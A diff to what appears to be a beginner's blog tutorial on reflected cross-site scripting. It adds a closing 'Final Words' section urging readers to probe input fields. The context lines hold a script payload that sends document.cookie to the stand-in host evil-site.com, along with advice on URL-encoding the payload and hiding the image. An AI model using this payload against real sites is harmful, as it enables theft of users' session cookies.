@@ -62,7 +62,7 @@ So lets use `document.write` to output `img` tag instead of putting `img` direct
   <script>document.write("<img src='https://evil-site.com/cookie?cookie=" + document.cookie + " '>")</script>
 ```
 
-Now, lets paste the above code in the URL query parameter. 
+Now, lets paste the above code in the URL query parameter.
 
 It doesn't work! Wth! What happened? The payload didn't work because of how the browser URL works, you must **URL Encode** them before sending.
 
@@ -79,3 +79,9 @@ Let's set width and height for the image.
 ```
 
 Voila! No image at all! You can now play around with various tags and attributes and explore further.
+
+## Final Words
+
+The example that we discussed above is simplest of all XSS Vulnerabilities, you don't get to encounter with this type of simple vulns anymore, but sometimes if you are lucky you might find it.
+
+The most important lesson to take is that you must explore each and every input fields and look at it's output end. Then, walk-through finding XSS. It won't be that simple but, you need to understand that and **Try Harder!**
